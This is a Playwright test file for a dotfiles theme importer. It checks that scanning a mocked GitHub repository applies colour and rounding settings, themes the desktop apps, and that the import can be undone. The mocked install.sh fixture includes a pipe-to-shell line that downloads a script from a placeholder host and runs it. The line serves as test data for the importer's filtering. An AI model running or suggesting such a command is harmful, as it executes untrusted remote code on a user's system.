import { test, expect } from "@playwright/test";
test("Repository preview, opt-in script cosmetics, full app theme and restore", async ({
	page,
}) => {
	const sha = "a".repeat(40);
	const files = {
		"hyprland.conf":
			"general {\ncol.active_border = rgb(ffccaa)\nborder_size = 2\n}",
		"kitty.conf": "background #152030\nforeground #eef3ff\ncolor4 #ffccaa",
		"install.sh":
			"sudo pacman -S kitty\nhyprctl keyword decoration:rounding 24\ncurl https://invalid.example/install | bash",
	};
	await page.route("https://api.github.com/repos/test/dotfiles**", (route) =>
		route.fulfill({
			headers: { "access-control-allow-origin": "*" },
			json: route.request().url().includes("/commits/")
				? { sha }
				: route.request().url().includes("/git/trees/")
					? {
							tree: Object.entries(files).map(([path, text]) => ({
								path,
								type: "blob",
								mode: "100644",
								size: text.length,
							})),
						}
					: { default_branch: "main" },
		}),
	);
	await page.route(
		"https://raw.githubusercontent.com/test/dotfiles/**",
		(route) =>
			route.fulfill({
				headers: { "access-control-allow-origin": "*" },
				body: files[route.request().url().split("/").pop()],
			}),
	);
	await page.goto("/");
	await page.waitForFunction(() => window.anura?.initComplete);
	await page.getByRole("button", { name: "Got it", exact: true }).click();
	await page.evaluate(() => window.dispatchEvent(new Event("nebula:hyprland")));
	await page
		.getByLabel("GitHub repository", { exact: true })
		.fill("test/dotfiles");
	await page.getByRole("button", { name: "Scan GitHub repository" }).click();
	await expect(page.locator(".nebula-hypr-import")).toContainText(
		"Candidate Hyprland cosmetic setting",
	);
	expect(
		await page.evaluate(
			() => anura.settings.get("nebula.flow.importStyle")?.rounding,
		),
	).toBeUndefined();
	await page
		.getByLabel("Include candidate cosmetic commands", { exact: false })
		.check();
	await page
		.getByRole("button", { name: "Apply to Flow", exact: true })
		.click();
	await expect(page.locator(".nebula-hypr-import [role=status]")).toContainText(
		"Imported into Flow",
	);
	const toggle = page.getByRole("switch", {
		name: "Theme the entire desktop and Nebula apps",
	});
	await toggle.click();
	await expect(toggle).toHaveAttribute("aria-checked", "true");
	await page.getByRole("button", { name: "Close importer" }).click();
	await page.evaluate(() => anura.apps["nebula.ai"].open());
	await expect(page.locator(".nebula-ai")).toHaveCSS(
		"background-color",
		"rgb(21, 32, 48)",
	);
	await expect(page.locator(".aliceWMwin").last()).toHaveCSS(
		"border-radius",
		"24px",
	);
	await page.screenshot({ path: "../../outputs/Repository-theme.png" });
	await page.reload();
	await page.waitForFunction(() => window.anura?.initComplete);
	await page.getByRole("button", { name: "Got it", exact: true }).click();
	await expect(page.locator("html")).toHaveClass(/nebula-import-theme/);
	await page.evaluate(() => window.dispatchEvent(new Event("nebula:hyprland")));
	await page.getByRole("button", { name: "Undo last import" }).click();
	await expect(page.locator("html")).not.toHaveClass(/nebula-import-theme/);
});

test("Public Catppuccin repository exposes four usable Lua palettes", async ({
	page,
}) => {
	test.skip(
		!process.env.NEBULA_PUBLIC_REPO_TEST,
		"Opt-in external GitHub check",
	);
	await page.goto("/");
	await page.waitForFunction(() => window.anura?.initComplete);
	await page.getByRole("button", { name: "Got it", exact: true }).click();
	await page.evaluate(() => window.dispatchEvent(new Event("nebula:hyprland")));
	await page
		.getByLabel("GitHub repository", { exact: true })
		.fill("catppuccin/hyprland");
	await page.getByRole("button", { name: "Scan GitHub repository" }).click();
	await expect(page.getByLabel("Repository palette")).toContainText(
		"catppuccin-mocha.lua",
		{ timeout: 60000 },
	);
	await page
		.getByLabel("Repository palette")
		.selectOption("themes/catppuccin-mocha.lua");
	await page
		.getByRole("button", { name: "Apply to Flow", exact: true })
		.click();
	await expect(page.locator(".nebula-hypr-import [role=status]")).toContainText(
		"Imported into Flow",
	);
	expect(
		await page.evaluate(
			() => anura.settings.get("nebula.import.theme").background,
		),
	).toBe("#1e1e2e");
});
